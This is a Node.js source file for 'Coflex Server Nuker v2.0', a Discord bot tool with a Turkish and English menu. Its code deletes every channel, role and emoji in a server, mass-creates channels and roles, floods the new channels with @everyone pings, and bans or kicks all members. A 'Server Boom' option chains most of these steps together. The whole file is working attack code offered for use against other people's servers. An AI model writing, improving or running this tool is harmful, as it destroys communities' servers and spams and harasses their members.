const fs = require('fs');
const readline = require('readline');
const { Client, GatewayIntentBits } = require('discord.js');

const CONFIG_PATH = 'config.json';
const ICON_PATH = 'icon.png'; 


const askQuestion = (query) => {
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout,
    });

    return new Promise(resolve => rl.question(query, answer => {
        rl.close();
        resolve(answer);
    }));
};


const chooseLanguage = async () => {
    const lang = await askQuestion('Please choose your language (tr/en): ');
    if (lang.trim().toLowerCase() === 'tr') {
        return 'tr';
    } else {
        return 'en';
    }
};


const getToken = async () => {
    if (fs.existsSync(CONFIG_PATH)) {
        const config = JSON.parse(fs.readFileSync(CONFIG_PATH, 'utf-8'));
        return config.token;
    } else {
        const token = await askQuestion('Please enter your bot token: ');
        fs.writeFileSync(CONFIG_PATH, JSON.stringify({ token }, null, 2));
        return token;
    }
};


const getGuild = async (client, language) => {
    const guildId = await askQuestion(language === 'tr' ? 'Lütfen sunucu ID\'sini girin: ' : 'Please enter the server ID: ');
    const guild = client.guilds.cache.get(guildId);
    if (!guild) {
        throw new Error(language === 'tr' ? 'Geçersiz sunucu ID\'si veya bot sunucuda değil.' : 'Invalid server ID or bot is not in the server.');
    }
    return guild;
};

const showCredits = () => {
    console.log(`
    \x1b[32m
    Gabimaru tarafından yapılmıştır gabimaru#0000
    \x1b[0m`); 
};



process.title = 'Coflex Server Nuker [v2.0] By gabimaru#0000';
const showAsciiArt = () => {
    console.clear();
    console.log(`
    \x1b[31m
     ▄████▄   ▒█████    █████▒██▓    ▓█████ ▒██   ██▒
    ▒██▀ ▀█  ▒██▒  ██▒▓██   ▒▓██▒    ▓█   ▀ ▒▒ █ █ ▒░
    ▒▓█    ▄ ▒██░  ██▒▒████ ░▒██░    ▒███   ░░  █   ░
    ▒▓▓▄ ▄██▒▒██   ██░░▓█▒  ░▒██░    ▒▓█  ▄  ░ █ █ ▒ 
    ▒ ▓███▀ ░░ ████▓▒░░▒█░   ░██████▒░▒████▒▒██▒ ▒██▒
    ░ ░▒ ▒  ░░ ▒░▒░▒░  ▒ ░   ░ ▒░▓  ░░░ ▒░ ░▒▒ ░ ░▓ ░
      ░  ▒     ░ ▒ ▒░  ░     ░ ░ ▒  ░ ░ ░  ░░░   ░▒ ░
    ░        ░ ░ ░ ▒   ░ ░     ░ ░      ░    ░    ░  
    ░ ░          ░ ░             ░  ░   ░  ░ ░    ░  
    ░   
    Coflex Server Nuker [v2.0] By gabimaru#0000                                            
    \x1b[0m`); 
};


const showMenu = async (language) => {
    console.log(language === 'tr' ? `
        1.  Kanalları Toplu Oluştur [Aktif]
        2.  Kanalları Toplu Oluştur ve Herkesi Etiketle [Aktif]
        3.  Rolleri Toplu Oluştur [Aktif]
        4.  Tüm Kanalları Sil [Aktif]
        5.  Tüm Rolleri Sil [Aktif]
        6.  Tüm Emojileri Sil [Soon Deleted]
        7.  Tüm Üyeleri Banla [Cooming Soon]
        8.  Tüm Üyeleri At [Cooming Soon]
        9.  Tüm Stickerları Sil [Soon Deleted]
        10. Server Patlatıcı [Aktif]
        11. Sunucu İsmini Değiştir [Aktif]
        12. Sunucu Resmini Değiştir [Aktif]
        13. Çıkış
        99. Kredi
    ` : `
        1.  Mass Create Channels [Active]
        2.  Mass Create Channels & Ping [Active]
        3.  Mass Create Roles [Active]
        4.  Delete All Channels [Active]
        5.  Delete All Roles [Active]
        6.  Delete All Emojis [Soon Deleted]
        7.  Ban All Members [Cooming Soon]
        8.  Kick All Members [Cooming Soon]
        9.  Delete All Stickers [Soon Deleted]
        10. Server Boom [Active]
        11. Change Server Name [Active]
        12. Change Server Icon [Active]
        13. Exit
        99. Credits
    `);
    const choice = await askQuestion(language === 'tr' ? 'Lütfen bir eylem seçin (1-13): ' : 'Please choose an action (1-13): ');
    return parseInt(choice, 10);
};


const showLoadingScreen = () => {
    console.clear();

    
    const text = "Developed by gabimaru";
    const colors = [
        "\x1b[38;2;0;123;255m",   
        "\x1b[38;2;0;255;255m",  
        "\x1b[38;2;0;255;123m",   
        "\x1b[38;2;123;0;255m"    
    ];

    const animationChars = ['-', '\\', '|', '/'];
    let animationIndex = 0;
    let progress = 0;
    const progressBarLength = 20;

    let textIndex = 0;

    return new Promise((resolve) => {
        const loadingInterval = setInterval(() => {
            
            process.stdout.write(`\r\x1b[38;2;102;51;153m[\x1b[38;2;255;0;255m${"#".repeat(progress)}${" ".repeat(progressBarLength - progress)}\x1b[38;2;102;51;153m]`);

            
            process.stdout.write(` ${colors[textIndex % colors.length]}${text.slice(0, textIndex)}\x1b[0m${text.slice(textIndex)}`);

            animationIndex %= animationChars.length;
            progress++;
            textIndex++;
            if (textIndex > text.length) textIndex = 0; 

            if (progress > progressBarLength) {
                clearInterval(loadingInterval);
                
                
                const pressEnterText = "Press Enter key to continue...";
                let pressEnterTextIndex = 0;
                const pressEnterInterval = setInterval(() => {
                    process.stdout.write(`\r\x1b[38;2;102;51;153m[\x1b[38;2;255;0;255m####################\x1b[38;2;102;51;153m] \x1b[0m${colors[pressEnterTextIndex % colors.length]}${pressEnterText.slice(0, pressEnterTextIndex)}\x1b[0m${pressEnterText.slice(pressEnterTextIndex)}   `);
                    pressEnterTextIndex++;
                    if (pressEnterTextIndex > pressEnterText.length) pressEnterTextIndex = 0;
                }, 100); 

                readline.cursorTo(process.stdout, 0);

                readline.emitKeypressEvents(process.stdin);
                process.stdin.on('keypress', (_, key) => {
                    if (key.name === 'return') {
                        clearInterval(pressEnterInterval); 
                        process.stdin.setRawMode(false);
                        process.stdin.removeAllListeners('keypress');
                        resolve();
                    }
                });
                process.stdin.setRawMode(true);
            }
        }, 100); 
    });
};


const main = async () => {
    try {
        console.clear(); 

        
        if (process.stdout.isTTY) { 
            try {
                
                process.stdout.write('\x1b[48;2;0;0;0m'); 
            } catch (error) {
               
            }
        }

        await showLoadingScreen();


        const language = await chooseLanguage();
        const TOKEN = await getToken();

        const client = new Client({
            intents: [
                GatewayIntentBits.Guilds,
                GatewayIntentBits.GuildMembers,
                GatewayIntentBits.GuildMessages,
                GatewayIntentBits.MessageContent,
            ],
        });

        client.once('ready', async () => {
            
            console.log(`Logged in as ${client.user.tag}!`);
            try {
                const guild = await getGuild(client, language);
                
                let choice;
                
                do {
                    showAsciiArt();
                    choice = await showMenu(language);
                    switch (choice) {
                        case 1:
                            await handleMassCreateChannels(guild, language);
                            break;
                        case 2:
                            await handleMassCreateChannelsAndPing(guild, language);
                            break;
                        case 3:
                            await handleMassCreateRoles(guild, language);
                            break;
                        case 4:
                            await handleDeleteAllChannels(guild, language);
                            break;
                        case 5:
                            await handleDeleteAllRoles(guild, language);
                            break;
                        case 6:
                            await handleDeleteAllEmojis(guild, language);
                            break;
                        case 7:
                            await handleBanAllMembers(guild, language);
                            break;
                        case 8:
                            await handleKickAllMembers(guild, language);
                            break;
                        case 9:
                            await handleDeleteAllStickers(guild, language);
                            break;
                        case 11:
                             await handleChangeServerName(guild, language);
                             break;
                         case 12:
                             await handleChangeServerIcon(guild, language);
                            break; 
                        case 13:
                            console.log(language === 'tr' ? 'Çıkılıyor...' : 'Exiting...');
                            break;
                            case 10:
                                   await handleBoomerCommand(guild, language);
                                    break;
                        default:
                            console.log(language === 'tr' ? 'Geçersiz seçim.' : 'Invalid choice.');
                    }
                } while (choice !== 10);
            } catch (error) {
                console.error('Error:', error.message);
            } finally {
                client.destroy();
            }
        });

        client.login(TOKEN);
    } catch (error) {
        console.error('Error:', error);
    }
};


const handleChangeServerName = async (guild, language) => {
    const newName = await askQuestion(language === 'tr' ? 'Yeni sunucu adı: ' : 'New server name: ');
    try {
        await guild.setName(newName);
        console.log(language === 'tr' ? 'Sunucu adı değiştirildi.' : 'Server name changed.');
    } catch (error) {
        console.error(language === 'tr' ? 'Sunucu adı değiştirilemedi:' : 'Failed to change server name:', error.message);
    }
};

const handleChangeServerIcon = async (guild, language) => {
    if (!fs.existsSync(ICON_PATH)) {
        console.error(language === 'tr' ? `"${ICON_PATH}" dosyası bulunamadı.` : `"${ICON_PATH}" file not found.`);
        return;
    }

    try {
        const iconBuffer = fs.readFileSync(ICON_PATH);
        await guild.setIcon(iconBuffer);
        console.log(language === 'tr' ? 'Sunucu resmi değiştirildi.' : 'Server icon changed.');
    } catch (error) {
        console.error(language === 'tr' ? 'Sunucu resmi değiştirilemedi:' : 'Failed to change server icon:', error.message);
    }
};
const handleBoomerCommand = async (guild, language) => {
    console.log(language === 'tr' ? 'Tüm komutlar ekleniyor...' : 'Adding all commands...');
    
    await handleDeleteAllChannels(guild, language);
    await handleDeleteAllRoles(guild, language);
    await handleMassCreateChannels(guild, language);
    await handleMassCreateChannelsAndPing(guild, language);
    await handleMassCreateRoles(guild, language);
    await handleDeleteAllEmojis(guild, language);

    console.log(language === 'tr' ? 'Tüm komutlar eklendi.' : 'All commands added.');
};
const handleMassCreateChannels = async (guild, language) => {
    const numChannels = await askQuestion(language === 'tr' ? 'Kaç kanal oluşturulsun? ' : 'How many channels to create? ');
    const channelsToCreate = parseInt(numChannels, 10);
    if (isNaN(channelsToCreate) || channelsToCreate <= 0) {
        console.log(language === 'tr' ? 'Geçersiz kanal sayısı.' : 'Invalid number of channels.');
        return;
    }
    const channelName = await askQuestion(language === 'tr' ? 'Kanalın adı ne olsun? ' : 'What should be the name of the channels? ');


    const createdChannels = await massCreateChannels(guild, channelsToCreate, channelName);
    console.log(`${channelsToCreate} ${language === 'tr' ? 'kanal oluşturuldu.' : 'channels created.'}`);

    const sendMessage = await askQuestion(language === 'tr' ? 'Oluşturulan kanallara mesaj gönderilsin mi? (y/n): ' : 'Send message to created channels? (y/n): ');
    if (sendMessage.trim().toLowerCase() === 'y') {
        const messageContent = await askQuestion(language === 'tr' ? 'Gönderilecek mesaj nedir? ' : 'What is the message to be sent? ');


        await sendMessagesToChannels(createdChannels, messageContent);
        console.log(`${language === 'tr' ? 'Mesajlar gönderildi.' : 'Messages sent.'}`);
    }
};


const sendMessagesToChannels = async (channels, messageContent) => {
    channels.forEach(async (channel) => {
        await channel.send(messageContent);
    });
};

const handleMassCreateChannelsAndPing = async (guild, language) => {
    const numChannelsPing = await askQuestion(language === 'tr' ? 'Kaç kanal oluşturulsun ve ping atılsın? ' : 'How many channels to create and ping? ');
    const channelsToCreateAndPing = parseInt(numChannelsPing, 10);
    if (isNaN(channelsToCreateAndPing) || channelsToCreateAndPing <= 0) {
        console.log(language === 'tr' ? 'Geçersiz kanal sayısı.' : 'Invalid number of channels.');
        return;
    }
    const channelNamePing = await askQuestion(language === 'tr' ? 'Kanalın adı ne olsun? ' : 'What should be the name of the channels? ');
    await massCreateChannelsAndPing(guild, channelsToCreateAndPing, channelNamePing);
    console.log(`${channelsToCreateAndPing} ${language === 'tr' ? 'kanal oluşturuldu ve herkes etiketlendi.' : 'channels created and pinged everyone.'}`);
};

const handleMassCreateRoles = async (guild, language) => {
    const numRoles = await askQuestion(language === 'tr' ? 'Kaç rol oluşturulsun? ' : 'How many roles to create? ');
    const rolesToCreate = parseInt(numRoles, 10);
    if (isNaN(rolesToCreate) || rolesToCreate <= 0) {
        console.log(language === 'tr' ? 'Geçersiz rol sayısı.' : 'Invalid number of roles.');
        return;
    }
    await massCreateRoles(guild, rolesToCreate);
    console.log(`${rolesToCreate} ${language === 'tr' ? 'rol oluşturuldu.' : 'roles created.'}`);
};

const handleDeleteAllChannels = async (guild, language) => {
    await deleteAllChannels(guild);
    console.log(language === 'tr' ? 'Tüm kanallar silindi.' : 'All channels deleted.');
};

const handleDeleteAllRoles = async (guild, language) => {
    await deleteAllRoles(guild, language);
    console.log(language === 'tr' ? 'Tüm roller silindi.' : 'All roles deleted.');
};

const handleDeleteAllEmojis = async (guild, language) => {
    await deleteAllEmojis(guild);
    console.log(language === 'tr' ? 'Tüm emojiler silindi.' : 'All emojis deleted.');
};

const handleBanAllMembers = async (guild, language) => {
    await banAllMembers(guild);
    console.log(language === 'tr' ? 'Tüm üyeler banlandı.' : 'All members banned.');
};

const handleKickAllMembers = async (guild, language) => {
    await kickAllMembers(guild);
    console.log(language === 'tr' ? 'Tüm üyeler atıldı.' : 'All members kicked.');
};

const handleDeleteAllStickers = async (guild, language) => {
    await deleteAllStickers(guild);
    console.log(language === 'tr' ? 'Tüm stickerlar silindi.' : 'All stickers deleted.');
};

// İşlevler
const massCreateChannels = async (guild, numberOfChannels, channelName) => {
    let createdChannels = [];
    for (let i = 0; i < numberOfChannels; i++) {
        const channel = await guild.channels.create({
            name: `${channelName}-${i + 1}`,
            type: 0,
        });
        createdChannels.push(channel);
    }
    return createdChannels;
};

const massCreateChannelsAndPing = async (guild, numberOfChannels, channelName) => {
    for (let i = 0; i < numberOfChannels; i++) {
        const channel = await guild.channels.create({
            name: `${channelName}-${i + 1}`,
            type: 0, 
        });
        channel.send('@everyone');
    }
};

const massCreateRoles = async (guild, numberOfRoles) => {
    for (let i = 0; i < numberOfRoles; i++) {
        await guild.roles.create({
            name: `role-${i + 1}`,
        });
    }
};

const deleteAllChannels = async (guild) => {
    const channels = guild.channels.cache;
    for (const [id, channel] of channels) {
        await channel.delete();
    }
};

const deleteAllRoles = async (guild, language) => {
    const roles = guild.roles.cache.filter(role => role.editable && role.id !== guild.id);
    if (roles.size === 0) {
        console.log(language === 'tr' ? 'Silinecek rol bulunamadı.' : 'No roles found to delete.');
        return;
    }
    for (const [id, role] of roles) {
        try {
            await role.delete();
            console.log(language === 'tr' ? `${role.name} rolü silindi.` : `${role.name} role deleted.`);
        } catch (error) {
            console.error(language === 'tr' ? `${role.name} rolü silinirken hata oluştu: ${error.message}` : `Error deleting ${role.name} role: ${error.message}`);
        }
    }
};

const deleteAllEmojis = async (guild) => {
    const emojis = guild.emojis.cache;
    for (const [id, emoji] of emojis) {
        await emoji.delete();
    }
};

const banAllMembers = async (guild) => {
    const members = guild.members.cache;
    for (const [id, member] of members) {
        if (member.bannable) {
            await member.ban();
        }
    }
};

const kickAllMembers = async (guild) => {
    const members = guild.members.cache;
    for (const [id, member] of members) {
        if (member.kickable) {
            await member.kick();
        }
    }
};

const deleteAllStickers = async (guild) => {
    const stickers = guild.stickers.cache;
    for (const [id, sticker] of stickers) {
        await sticker.delete();
    }
};

main();
